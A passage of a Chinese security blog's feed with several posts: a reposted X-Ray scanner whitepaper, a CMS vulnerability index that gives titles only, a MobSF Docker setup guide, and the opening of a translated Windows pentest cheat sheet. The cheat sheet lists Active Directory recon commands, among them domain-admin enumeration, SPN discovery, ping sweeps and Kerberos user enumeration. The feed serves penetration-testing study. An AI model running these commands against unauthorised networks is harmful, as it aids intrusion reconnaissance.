class="lozad"></p><p>（X-Ray）提供多种模式的爬虫扫描，包括普通爬虫和模拟浏览器的爬虫，<br>完美支持Web2.0网站、H5页面、单页网页应用、前后端网页应用等，并能模拟客户端发出的请求，动态解析javascript及动态渲染DOM结构。<br>同时，用户可利用请求调度引擎，根据需求调整HTTP请求的参数和速率，根据<br>网站情况自由控制扫描速度，既不会因为扫描太快影响业务导致系统瘫痪，也不会因为速度太慢影响扫描需求。<br>目前，X-Ray除了能覆盖主流常见的各漏洞类型，还支持检测XSS、SQL注入、敏感信息泄露、任意跳转、Web登录表单的爆破五种高危漏洞。</p><h2 id="2-4-XSS漏洞检测"><a href="#2-4-XSS漏洞检测" class="headerlink" title="2.4 XSS漏洞检测"></a>2.4 XSS漏洞检测</h2><p>XSS漏洞检测包括GET参数、请求头部、POST参数，支持多种Content-Type的分析检测。通过对网页进行静态分析，过滤注入点从而降低误报率。通过对网页进行动态分析，判定需要基于网页渲染执行的XSS，降低漏报率，不遗漏任何漏洞。</p><h2 id="2-5-SQL注入漏洞检测"><a href="#2-5-SQL注入漏洞检测" class="headerlink" title="2.5 SQL注入漏洞检测"></a>2.5 SQL注入漏洞检测</h2><p>SQL注入漏洞检测包括GET参数、请求头部、POST参数，支持多种Con-<br>tent-Type的分析检测。运用基于响应时间、响应请求的文本特征与结构特征等维度的智能算法多方面判定漏洞，确保高发现率和低误报率。</p><h2 id="2-6-敏感信息泄露漏洞检测"><a href="#2-6-敏感信息泄露漏洞检测" class="headerlink" title="2.6 敏感信息泄露漏洞检测"></a>2.6 敏感信息泄露漏洞检测</h2><p>敏感信息泄露漏洞检测能够发现的信息有：<br>· 敏感文件：备份文件、源码仓库、后台登录页面、WebShell、临时文件等。<br>· 敏感信息：debug信息、报错信息、用户隐私信息等。<br>检测扫描敏感文件、敏感信息，依据返回包的相关特征智能判断是否存在信息泄<br>露，误报率较低。</p><h2 id="2-7-Web登录表单的爆破漏洞检测"><a href="#2-7-Web登录表单的爆破漏洞检测" class="headerlink" title="2.7  Web登录表单的爆破漏洞检测"></a>2.7  Web登录表单的爆破漏洞检测</h2><p>X-Ray通过对网页分别进行静态分析和动态分析，得出合法的表单认证请求，保证爆破过程正常进行，集成具有代表性的爆破字典和领先的爆破算法，能高效地完成爆破任务。</p><h1 id="0x03-从发现到修复，多维展示安全状态"><a href="#0x03-从发现到修复，多维展示安全状态" class="headerlink" title="0x03 从发现到修复，多维展示安全状态"></a>0x03 从发现到修复，多维展示安全状态</h1><p>X-Ray不仅能实时呈现扫描结果，并且可以展示多维、详细的漏洞信息，从不同角度体现风险情况，并给出建议修复方案，帮助企业全面掌握更丰富的安全状态。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191012174504.png" class="lozad"></p><p>不同需求的用户可从中得到对应的信息，以便快速理解逐个漏洞的危害与影响，<br>有效修复关键漏洞。<br>同时，依托长亭长期的高标准安全服务，X-Ray在发现漏洞后，第一时<br>间给出系列修复建议：</p><ol><li>紧急修复方案：无需用户参与，即可指导用户在WAF等安全防护产品上添加规则，及时避免损失。</li><li>应用升级策略：对于发生在成熟服务应用上的漏洞，查找应用版本提供升级信息，或及时打上补丁。</li><li>代码修复方案：提供代码修改信息，通过编程的方式彻底修复漏洞。X-Ray支持统一管理扫描发现的全部漏洞，根据漏洞状态跟踪全生命期，并同时促进修复的闭环，提升整个企业的安全性。漏洞管理功能可集中查看修复状态、安排复测工作，支持根据多种条件对漏洞进行筛选。</li></ol><h2 id="3-1-漏洞修复状态"><a href="#3-1-漏洞修复状态" class="headerlink" title="3.1 漏洞修复状态"></a>3.1 漏洞修复状态</h2><p>支持手动更改修复状态，对漏洞进行标记，可单独设置状态或批量操作，跟踪漏洞生命周期。</p><h2 id="3-2-漏洞复测"><a href="#3-2-漏洞复测" class="headerlink" title="3.2 漏洞复测"></a>3.2 漏洞复测</h2><p>系统即时或预设定时进行循环扫描，批量进行漏洞复测并验收漏洞修复状况。</p><h1 id="0x04-集中维护，轻松管理千万级资产"><a href="#0x04-集中维护，轻松管理千万级资产" class="headerlink" title="0x04 集中维护，轻松管理千万级资产"></a>0x04 集中维护，轻松管理千万级资产</h1><p>不同于传统扫描器对用户资产只能进行罗列展示，X-Ray的资产管理功能可以对资产进行一站式增加、删除、编辑、导出等操作，帮助用户从域名、主机、服务、网站、资产分布、风险分布等维度进行数据统计。对于同一资产，用户可与历史扫描结果对比，清晰了解不同资产的安全态势变化。<br>X-Ray支持从扫描结果自动导入资产，可以由管理员手动补充修正。资产分为域名、主机、服务、网站四类，每种资产都提供单独的管理方式，用户可根据企业需求选择分类，轻松管理千万级的大量资产，增强系统安全性，降低安全风险。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191012174654.png" class="lozad"></p><p>资产扫描完成后，管理功能支持根据域名、主机、服务、网站、操作系统版<br>本、资产安全状态等对资产列表进行统一管理，概括而言主要有以下三个方面的<br>特色：<br>    1） 不同资产单独管理以匹配企业需求，降低安全风险；<br>    2） 支持扫描发现资产和手动维护并行，可实现交叉处理从而提高管理效率；<br>    3） 实时更新资产信息，安全状态清晰明了。</p><p>#0x05策略级统计分析，提供全面决策依据</p><p>IT系统资产规模越来越大，风险资产、漏洞数量越来越多，如何从海量的风险数据中找到需要优先处理的问题，已经成为安全运维人员面临的一个难题。<br>X-Ray能够导出资产、漏洞、扫描结果等多项报告，每种报告提供丰富的报告模板，详细展示发现的信息。高度自定义生成的报告，辅助丰富的可视化效果，方便直观展示内容。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191012174746.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191012174801.png" class="lozad"></p><p>通过对发现的漏洞进行评分，标记危险等级，X-Ray能根据漏洞严重程度进行排序，快速定位具体漏洞，重点关注需要优先修复的问题。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191012174834.png" class="lozad"></p><h1 id="0x06-X-Ray安全评估系统优势"><a href="#0x06-X-Ray安全评估系统优势" class="headerlink" title="0x06 X-Ray安全评估系统优势"></a>0x06 X-Ray安全评估系统优势</h1><h2 id="6-1-高发现率，低误报率"><a href="#6-1-高发现率，低误报率" class="headerlink" title="6.1 高发现率，低误报率"></a>6.1 高发现率，低误报率</h2><p>X-Ray由长亭高质量的漏洞库和多个功能插件模块支撑，扫描质量高。不同于使用第三方漏洞库，长亭的漏洞库从多年攻防实战和安全服务项目经验中提炼而得，并由专人团队进行维护，更新速度快且质量高，大大提高了漏洞的发现率。同时，<br>X-Ray结合主动扫描和被动扫描两种方式，降低误报率，发现更隐蔽的漏洞。</p><h2 id="6-2-多维定位扫描结果"><a href="#6-2-多维定位扫描结果" class="headerlink" title="6.2 多维定位扫描结果"></a>6.2 多维定位扫描结果</h2><p>X-Ray全面展示资产信息和风险列表，最终输出详细的扫描评估结果，并给出建议修复方案。扫描结果从多个角度对漏洞进行描述，企业管理者可迅速获知企业安全的薄弱环节，制定针对性的安全策略，安全运维人员则可获取详细的技术信息，为后期修复提供支持。</p><h2 id="6-3-不影响业务运转"><a href="#6-3-不影响业务运转" class="headerlink" title="6.3 不影响业务运转"></a>6.3 不影响业务运转</h2><p>在扫描过程中，漏洞检测必须做到安全有效，否则可能会对扫描目标产生不可恢<br>复的影响。X-Ray从三个方面进行控制，实现精准扫描的同时不影响业务：<br>1）核心扫描技术由长亭经验丰富的安全团队提供，确保扫描过程中使用完全无<br>害且能确认漏洞的Payload。<br>2）智能识别并绕过可能对业务产生副作用的API。<br>3）通过智能探测或手动调整的方式合理控制扫描速度，确保不对业务产生压力。</p><h2 id="6-4开放API方便集成使用"><a href="#6-4开放API方便集成使用" class="headerlink" title="6.4开放API方便集成使用"></a>6.4开放API方便集成使用</h2><p>X-Ray以Open API的方式提供所有功能，可以方便地被自动化调用，<br>同时能够与其他安全产品（如SOC、SIEM、JIRA、Redmine等）整合。<br>当行业爆发0day漏洞时，长亭应急响应团队会快速跟进，分析漏洞产生的原因，<br>在极短时间内提供POC扫描插件，用户只需要上传扫描插件，即可对0day漏洞进行<br>全面检查，保障企业网络安全。<br>X-Ray还支持一键导入长亭渗透测试报告，跟进漏洞的全生命周期，促<br>进漏洞修复。</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在之前介绍过一篇长亭科技开发的工具叫X-ray，今天在网上看到了这款工具的白皮书，为了防止以后找不到了，这里直接以文章的形式记录下来。如有侵权，请联系删除！&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="X-RAY" scheme="https://www.mad-coding.cn/tags/X-RAY/"/>
    
  </entry>
  
  <entry>
    <title>CMS漏洞集合</title>
    <link href="https://www.mad-coding.cn/2019/10/12/CMS%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/"/>
    <id>https://www.mad-coding.cn/2019/10/12/CMS漏洞集合/</id>
    <published>2019-10-12T02:24:53.000Z</published>
    <updated>2019-10-12T03:30:04.526Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在渗透测试的过程中，会碰到各种CMS搭建的网站，为了积累自己的经验，决定将每种CMS爆出的漏洞整理成文章，这样既方便自己查看，也可以分享给需要的人，大家共同讨论，进步。</p><a id="more"></a><h1 id="0x01-DedeCMS"><a href="#0x01-DedeCMS" class="headerlink" title="0x01 DedeCMS"></a>0x01 DedeCMS</h1><h2 id="1-1-DedeCMS-v5-7-shops-delivery-存储型XSS"><a href="#1-1-DedeCMS-v5-7-shops-delivery-存储型XSS" class="headerlink" title="1.1 DedeCMS_v5.7_shops_delivery_存储型XSS"></a>1.1 DedeCMS_v5.7_shops_delivery_存储型XSS</h2><h2 id="1-2-DedeCMS-v5-7-carbuyaction-存储型XSS"><a href="#1-2-DedeCMS-v5-7-carbuyaction-存储型XSS" class="headerlink" title="1.2 DedeCMS_v5.7_carbuyaction_存储型XSS"></a>1.2 DedeCMS_v5.7_carbuyaction_存储型XSS</h2><h2 id="1-3-DedeCMS-v5-7-友情链接CSRF-GetShell"><a href="#1-3-DedeCMS-v5-7-友情链接CSRF-GetShell" class="headerlink" title="1.3 DedeCMS_v5.7_友情链接CSRF_GetShell"></a>1.3 DedeCMS_v5.7_友情链接CSRF_GetShell</h2><h2 id="1-4-DedeCMS-V5-7-SP2后台存在代码执行漏洞"><a href="#1-4-DedeCMS-V5-7-SP2后台存在代码执行漏洞" class="headerlink" title="1.4 DedeCMS V5.7 SP2后台存在代码执行漏洞"></a>1.4 DedeCMS V5.7 SP2后台存在代码执行漏洞</h2><h1 id="0x02-Discuz"><a href="#0x02-Discuz" class="headerlink" title="0x02 Discuz"></a>0x02 Discuz</h1><h2 id="2-1-Discuz-＜3-4-birthprovince-前台任意文件删除"><a href="#2-1-Discuz-＜3-4-birthprovince-前台任意文件删除" class="headerlink" title="2.1 Discuz_＜3.4_birthprovince_前台任意文件删除"></a>2.1 Discuz_＜3.4_birthprovince_前台任意文件删除</h2><h1 id="0x03-Drupal"><a href="#0x03-Drupal" class="headerlink" title="0x03 Drupal"></a>0x03 Drupal</h1><h2 id="3-1-Drupal远程代码执行漏洞-CVE-2017-6920"><a href="#3-1-Drupal远程代码执行漏洞-CVE-2017-6920" class="headerlink" title="3.1 Drupal远程代码执行漏洞(CVE-2017-6920)"></a>3.1 Drupal远程代码执行漏洞(CVE-2017-6920)</h2><h1 id="0x04-Ecshop"><a href="#0x04-Ecshop" class="headerlink" title="0x04 Ecshop"></a>0x04 Ecshop</h1><h1 id="0x05-FineCMS"><a href="#0x05-FineCMS" class="headerlink" title="0x05 FineCMS"></a>0x05 FineCMS</h1><h2 id="5-1-FineCMS最新版5-0-8两处getshell"><a href="#5-1-FineCMS最新版5-0-8两处getshell" class="headerlink" title="5.1 FineCMS最新版5.0.8两处getshell"></a>5.1 FineCMS最新版5.0.8两处getshell</h2><h1 id="0x06-Joomla"><a href="#0x06-Joomla" class="headerlink" title="0x06 Joomla"></a>0x06 Joomla</h1><h2 id="6-1-Joomla-3-7-0-SQL注入-CVE-2017-8917"><a href="#6-1-Joomla-3-7-0-SQL注入-CVE-2017-8917" class="headerlink" title="6.1 Joomla_3.7.0_SQL注入(CVE-2017-8917)"></a>6.1 Joomla_3.7.0_SQL注入(CVE-2017-8917)</h2><h2 id="6-2-Joomla-3-4-4-3-6-3-未授权创建特权用户-CVE-2016-8869"><a href="#6-2-Joomla-3-4-4-3-6-3-未授权创建特权用户-CVE-2016-8869" class="headerlink" title="6.2 Joomla_3.4.4-3.6.3_未授权创建特权用户(CVE-2016-8869)"></a>6.2 Joomla_3.4.4-3.6.3_未授权创建特权用户(CVE-2016-8869)</h2><h1 id="0x07-Metinfo"><a href="#0x07-Metinfo" class="headerlink" title="0x07 Metinfo"></a>0x07 Metinfo</h1><h1 id="0x08-PHPCMS"><a href="#0x08-PHPCMS" class="headerlink" title="0x08 PHPCMS"></a>0x08 PHPCMS</h1><h2 id="8-1-PHPCMS-v9-6-0-SQL注入"><a href="#8-1-PHPCMS-v9-6-0-SQL注入" class="headerlink" title="8.1 PHPCMS_v9.6.0_SQL注入"></a>8.1 PHPCMS_v9.6.0_SQL注入</h2><h2 id="8-2-PHPCMS-v9-6-0-任意文件上传"><a href="#8-2-PHPCMS-v9-6-0-任意文件上传" class="headerlink" title="8.2 PHPCMS_v9.6.0_任意文件上传"></a>8.2 PHPCMS_v9.6.0_任意文件上传</h2><h2 id="8-3-PHPCMS-v9-6-1-任意文件下载"><a href="#8-3-PHPCMS-v9-6-1-任意文件下载" class="headerlink" title="8.3 PHPCMS_v9.6.1_任意文件下载"></a>8.3 PHPCMS_v9.6.1_任意文件下载</h2><h2 id="8-4-PHPCMS-v9-6-2-任意文件下载"><a href="#8-4-PHPCMS-v9-6-2-任意文件下载" class="headerlink" title="8.4 PHPCMS_v9.6.2_任意文件下载"></a>8.4 PHPCMS_v9.6.2_任意文件下载</h2><h1 id="0x09-Struts"><a href="#0x09-Struts" class="headerlink" title="0x09 Struts"></a>0x09 Struts</h1><h2 id="9-1-S2-048-CVE-CVE-2017-9791"><a href="#9-1-S2-048-CVE-CVE-2017-9791" class="headerlink" title="9.1 S2-048(CVE-CVE-2017-9791)"></a>9.1 S2-048(CVE-CVE-2017-9791)</h2><h1 id="0x10-ThinkPHP"><a href="#0x10-ThinkPHP" class="headerlink" title="0x10 ThinkPHP"></a>0x10 ThinkPHP</h1><h2 id="10-1-ThinkPHP-3-2-3-5-0-10-缓存函数设计缺陷"><a href="#10-1-ThinkPHP-3-2-3-5-0-10-缓存函数设计缺陷" class="headerlink" title="10.1 ThinkPHP_3.2.3-5.0.10_缓存函数设计缺陷"></a>10.1 ThinkPHP_3.2.3-5.0.10_缓存函数设计缺陷</h2><h1 id="0x11-ThinkSNS"><a href="#0x11-ThinkSNS" class="headerlink" title="0x11 ThinkSNS"></a>0x11 ThinkSNS</h1><h2 id="11-1-ThinkSNS-V4-后台任意文件下载导致Getshell"><a href="#11-1-ThinkSNS-V4-后台任意文件下载导致Getshell" class="headerlink" title="11.1 ThinkSNS_V4 后台任意文件下载导致Getshell"></a>11.1 ThinkSNS_V4 后台任意文件下载导致Getshell</h2><h1 id="0x12-WebLogic"><a href="#0x12-WebLogic" class="headerlink" title="0x12 WebLogic"></a>0x12 WebLogic</h1><h2 id="12-1-CVE-2017-3506-amp-CVE-2017-10271-XmlDecoder"><a href="#12-1-CVE-2017-3506-amp-CVE-2017-10271-XmlDecoder" class="headerlink" title="12.1 CVE-2017-3506 &amp; CVE-2017-10271 XmlDecoder"></a>12.1 CVE-2017-3506 &amp; CVE-2017-10271 XmlDecoder</h2><h2 id="12-2-CVE-2018-2628-T3-Deserialize"><a href="#12-2-CVE-2018-2628-T3-Deserialize" class="headerlink" title="12.2 CVE-2018-2628 T3 Deserialize"></a>12.2 CVE-2018-2628 T3 Deserialize</h2><h2 id="12-3-CVE-2018-2628-bypassing-CVE-2018-2893-T3-Deserialize"><a href="#12-3-CVE-2018-2628-bypassing-CVE-2018-2893-T3-Deserialize" class="headerlink" title="12.3 CVE-2018-2628 bypassing CVE-2018-2893 T3 Deserialize"></a>12.3 CVE-2018-2628 bypassing CVE-2018-2893 T3 Deserialize</h2><h1 id="0x13-WordPress"><a href="#0x13-WordPress" class="headerlink" title="0x13 WordPress"></a>0x13 WordPress</h1><h2 id="13-1-WordPress-4-4-SSRF"><a href="#13-1-WordPress-4-4-SSRF" class="headerlink" title="13.1 WordPress_4.4_SSRF"></a>13.1 WordPress_4.4_SSRF</h2><h2 id="13-2-WordPress-4-7-Info-Disclosure"><a href="#13-2-WordPress-4-7-Info-Disclosure" class="headerlink" title="13.2 WordPress_4.7_Info_Disclosure"></a>13.2 WordPress_4.7_Info_Disclosure</h2><h2 id="13-3-WordPress-4-7-0-4-7-1-未授权内容注入"><a href="#13-3-WordPress-4-7-0-4-7-1-未授权内容注入" class="headerlink" title="13.3 WordPress_4.7.0-4.7.1_未授权内容注入"></a>13.3 WordPress_4.7.0-4.7.1_未授权内容注入</h2><h2 id="13-4-Wordpress-lt-4-9-6-任意文件删除漏洞"><a href="#13-4-Wordpress-lt-4-9-6-任意文件删除漏洞" class="headerlink" title="13.4 Wordpress &lt;= 4.9.6 任意文件删除漏洞"></a>13.4 Wordpress &lt;= 4.9.6 任意文件删除漏洞</h2><h1 id="0x14-seacms"><a href="#0x14-seacms" class="headerlink" title="0x14 seacms"></a>0x14 seacms</h1><h2 id="14-1-SeaCMS-v6-45前台Getshell-代码执行"><a href="#14-1-SeaCMS-v6-45前台Getshell-代码执行" class="headerlink" title="14.1 SeaCMS v6.45前台Getshell 代码执行"></a>14.1 SeaCMS v6.45前台Getshell 代码执行</h2><h2 id="14-2-seacms6-54代码执行"><a href="#14-2-seacms6-54代码执行" class="headerlink" title="14.2 seacms6.54代码执行"></a>14.2 seacms6.54代码执行</h2><h2 id="14-3-seacms-6-55-代码执行"><a href="#14-3-seacms-6-55-代码执行" class="headerlink" title="14.3 seacms 6.55 代码执行"></a>14.3 seacms 6.55 代码执行</h2><h2 id="14-4-seacms6-61-XSS"><a href="#14-4-seacms6-61-XSS" class="headerlink" title="14.4 seacms6.61 XSS"></a>14.4 seacms6.61 XSS</h2><h2 id="14-5-Seacms6-61后台getshell"><a href="#14-5-Seacms6-61后台getshell" class="headerlink" title="14.5 Seacms6.61后台getshell"></a>14.5 Seacms6.61后台getshell</h2><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_V5.7" target="_blank" rel="noopener">https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_V5.7</a>_</p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在渗透测试的过程中，会碰到各种CMS搭建的网站，为了积累自己的经验，决定将每种CMS爆出的漏洞整理成文章，这样既方便自己查看，也可以分享给需要的人，大家共同讨论，进步。&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="漏洞" scheme="https://www.mad-coding.cn/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>使用docker安装移动安全框架（MobSF）</title>
    <link href="https://www.mad-coding.cn/2019/10/11/%E4%BD%BF%E7%94%A8docker%E5%AE%89%E8%A3%85%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E6%A1%86%E6%9E%B6%EF%BC%88MobSF%EF%BC%89/"/>
    <id>https://www.mad-coding.cn/2019/10/11/使用docker安装移动安全框架（MobSF）/</id>
    <published>2019-10-11T08:24:31.000Z</published>
    <updated>2019-10-28T08:47:07.558Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>移动安全框架（MobSF）是一种自动化的一体化移动应用程序（Android /iOS /Windows）笔测试框架，能够执行静态，动态和恶意软件分析。它可用于Android，iOS和Windows移动应用程序的有效和快速安全分析，并支持二进制文件（APK，IPA和APPX）和压缩源代码。MobSF可以在运行时为Android应用程序进行动态应用程序测试，并具有由<a href="https://github.com/MobSF/CapFuzz" target="_blank" rel="noopener">CapFuzz</a>（一种特定于Web API的安全扫描程序）提供支持的Web API模糊测试功能。MobSF旨在使您的CI / CD或DevSecOps管道集成无缝。</p><a id="more"></a><h1 id="0x01-开始安装"><a href="#0x01-开始安装" class="headerlink" title="0x01 开始安装"></a>0x01 开始安装</h1><blockquote><p>安装环境：</p><p>Kali Linux x64</p><p>Docker</p><p>Python3.6环境</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#使用python3环境</span></span><br><span class="line">update-alternatives --config python</span><br></pre></td></tr></table></figure><p>选择python3前面的编号</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011164429.png" class="lozad"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#卸载docker，如何之前安装的话</span></span><br><span class="line">apt-get purge docker.io</span><br></pre></td></tr></table></figure><p>下载docker安装包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget  https://download.docker.com/linux/debian/dists/jessie/pool/stable/amd64/docker-ce_17.06.2~ce-0~debian_amd64.deb</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011162729.png" class="lozad"></p><p>安装docker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg  -i docker-ce_17.06.2~ce-0~debian_amd64.deb</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011162757.png" class="lozad"></p><p>启动docker服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service  docker restart</span><br></pre></td></tr></table></figure><p>docker一键部署framework-mobsf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull opensecurity/mobile-security-framework-mobsf</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011162850.png" class="lozad"></p><h1 id="0x02-开始使用"><a href="#0x02-开始使用" class="headerlink" title="0x02 开始使用"></a>0x02 开始使用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest</span><br></pre></td></tr></table></figure><p>然后在kali中使用获取浏览器访问：htpp://0.0.0.0:8000</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011162947.png" class="lozad"></p><p>或者使用ifconfig命令查看kali的ip地址，然后使用<a href="http://kali的ip地址:8000访问" target="_blank" rel="noopener">http://kali的ip地址:8000访问</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011163001.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011163010.png" class="lozad"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>如果不适用docker一键化部署的话，可能非常的繁琐，所以这里使用了docker进行一键化部署，由于是同事推荐的，然后直接教我怎么部署了，这里也避免走了一些坑，所以大家在部署的过程中还碰到坑的话，就自行百度吧 ^v^.</p><p><img alt="img" data-src="https://i01piccdn.sogoucdn.com/f8a32ef987767296" class="lozad"></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;移动安全框架（MobSF）是一种自动化的一体化移动应用程序（Android /iOS /Windows）笔测试框架，能够执行静态，动态和恶意软件分析。它可用于Android，iOS和Windows移动应用程序的有效和快速安全分析，并支持二进制文件（APK，IPA和APPX）和压缩源代码。MobSF可以在运行时为Android应用程序进行动态应用程序测试，并具有由&lt;a href=&quot;https://github.com/MobSF/CapFuzz&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CapFuzz&lt;/a&gt;（一种特定于Web API的安全扫描程序）提供支持的Web API模糊测试功能。MobSF旨在使您的CI / CD或DevSecOps管道集成无缝。&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="MobSF" scheme="https://www.mad-coding.cn/tags/MobSF/"/>
    
  </entry>
  
  <entry>
    <title>Windows Notes</title>
    <link href="https://www.mad-coding.cn/2019/10/11/Windows-Notes/"/>
    <id>https://www.mad-coding.cn/2019/10/11/Windows-Notes/</id>
    <published>2019-10-11T07:37:46.000Z</published>
    <updated>2019-10-16T02:57:22.331Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文为翻译文章，为了记录在对Windows系统进行渗透测试过程中的一些命令和知识。</p><p>原文链接：<a href="https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html" target="_blank" rel="noopener">https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html</a></p><a id="more"></a><h1 id="0x01-列举"><a href="#0x01-列举" class="headerlink" title="0x01 列举"></a>0x01 列举</h1><h2 id="1-1-基本命令"><a href="#1-1-基本命令" class="headerlink" title="1.1 基本命令"></a>1.1 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">net users</span><br><span class="line">net users /domain</span><br><span class="line">net localgroup</span><br><span class="line">net groups /domain</span><br><span class="line">net groups /domain &quot;Domain Admins&quot;</span><br><span class="line"></span><br><span class="line">Get-ADUser</span><br><span class="line">Get-Domain</span><br><span class="line">Get-DomainUser</span><br><span class="line">Get-DomainGroup</span><br><span class="line">Get-DomainGroupMember -identity &quot;Domain Admins&quot; -Domain m0chanAD.local -DomainController 10.10.14.10</span><br><span class="line">Find-DomainShare</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Host Discovery</span><br><span class="line">netdiscover -r subnet/24</span><br><span class="line">nbtscan -r [range]</span><br><span class="line">for /L %i in (1,1,255) do  @ping.exe -n 1 -w 50 &lt;10.10.10&gt;.%i | findstr TTL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Reverse DNS Lookup</span><br><span class="line">$ComputerIPAddress = &quot;10.10.14.14&quot;</span><br><span class="line">[System.Net.Dns]::GetHostEntry($ComputerIPAddress).HostName</span><br></pre></td></tr></table></figure><p><a href="https://github.com/tevora-threat/SharpView" target="_blank" rel="noopener">https://github.com/tevora-threat/SharpView</a></p><h3 id="1-1-1-具有SPN的用户"><a href="#1-1-1-具有SPN的用户" class="headerlink" title="1.1.1 具有SPN的用户"></a>1.1.1 具有SPN的用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -SPN</span><br><span class="line"></span><br><span class="line">Get-ADComputer -filter &#123;ServicePrincipalName -like &lt;keyword&gt;&#125; -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,</span><br><span class="line">PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation</span><br></pre></td></tr></table></figure><h3 id="1-1-2-Kerberos枚举"><a href="#1-1-2-Kerberos枚举" class="headerlink" title="1.1.2 Kerberos枚举"></a>1.1.2 Kerberos枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=&apos;test&apos;</span><br></pre></td></tr></table></figure><h3 id="1-1-3-红队CSharp脚本"><a 